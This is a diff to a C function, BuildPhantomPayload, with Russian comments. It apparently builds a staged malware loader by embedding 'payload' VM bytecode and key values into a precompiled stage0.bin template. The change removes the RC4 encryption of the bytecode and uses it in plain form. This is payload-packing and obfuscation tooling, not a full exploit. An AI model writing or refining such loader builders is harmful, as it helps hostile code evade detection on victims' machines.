@@ -551,42 +551,10 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     // Полезная нагрузка уже внутри байткода, можно освободить
     free(payload);
 
-    // --- Шаг 3: Шифрование Байткода --- 
-    // Используем случайный ключ, если не задан
-    BYTE final_key[32];
-    int final_key_size = config->key_size > 0 ? config->key_size : 16; // По умолчанию 16
-    if (config->key_size > 0) {
-        memcpy(final_key, config->key, final_key_size);
-        printf("[+] Используем предоставленный ключ шифрования\n");
-    } else {
-        GenerateRandomKey(final_key, final_key_size);
-        printf("[+] Генерируем случайный %d-байтный ключ шифрования\n", final_key_size);
-        // TODO: Вывести ключ?
-    }
-
-    SIZE_T encrypted_size = 0; 
-    // Используем стандартный RC4, как в stage0
-    BYTE* s_block = (BYTE*)malloc(256);
-    BYTE* encrypted_bytecode = (BYTE*)malloc(bytecode_size);
-    if (!s_block || !encrypted_bytecode) {
-        if(s_block) free(s_block);
-        if(encrypted_bytecode) free(encrypted_bytecode);
-        free(bytecode);
-        printf("[-] Ошибка выделения памяти для шифрования\n");
-        return FALSE;
-    }
-    rc4_ksa(final_key, final_key_size, s_block);
-    // Важно: rc4_crypt модифицирует S-блок, поэтому нужно его сбрасывать для каждого использования
-    // Создадим копию для шифрования
-    BYTE* crypt_s_block = (BYTE*)malloc(256);
-    memcpy(crypt_s_block, s_block, 256);
-    rc4_crypt(crypt_s_block, bytecode, encrypted_bytecode, bytecode_size); 
-    free(s_block);
-    free(crypt_s_block);
-    free(bytecode); // Оригинальный байткод больше не нужен
-    encrypted_size = bytecode_size; // Размер не меняется при RC4
-    
-    printf("[+] Байткод VM зашифрован RC4 (%zu байт)\n", encrypted_size);
+    // --- Шаг 3: Упрощённое шифрование байткода (plain) ---
+    BYTE* encrypted_bytecode = bytecode;
+    SIZE_T encrypted_size = bytecode_size;
+    printf("[*] Шифрование отключено: используем plain байткод (%zu байт)\n", encrypted_size);
     
     // --- Шаг 4: Загрузка предкомпилированного stage0.bin --- 
     printf("[*] Загружаем предкомпилированный загрузчик: %s\n", config->template_file); 
@@ -611,8 +579,8 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     // Поиск и замена размера ключа
     BYTE* key_size_ptr = FindMarker(stage0_data, stage0_size, (BYTE*)&key_size_marker_val, sizeof(key_size_marker_val));
     if (key_size_ptr) {
-        *(uint64_t*)key_size_ptr = (uint64_t)final_key_size;
-        printf("[+] Размер ключа (%d) вставлен.\n", final_key_size);
+        *(uint64_t*)key_size_ptr = (uint64_t)config->key_size;
+        printf("[+] Размер ключа (%d) вставлен.\n", config->key_size);
     } else {
         printf("[-] Ошибка: Маркер размера ключа не найден в %s\n", config->template_file);
         free(stage0_data);
@@ -621,9 +589,9 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     }
 
     // Поиск и замена ключа
-    BYTE* key_ptr = FindMarker(stage0_data, stage0_size, key_marker_val, final_key_size); // Размер маркера = размеру ключа
+    BYTE* key_ptr = FindMarker(stage0_data, stage0_size, key_marker_val, config->key_size); // Размер маркера = размеру ключа
     if (key_ptr) {
-        memcpy(key_ptr, final_key, final_key_size);
+        memcpy(key_ptr, config->key, config->key_size);
         printf("[+] Ключ шифрования вставлен.\n");
     } else {
         printf("[-] Ошибка: Маркер ключа шифрования не найден в %s\n", config->template_file);
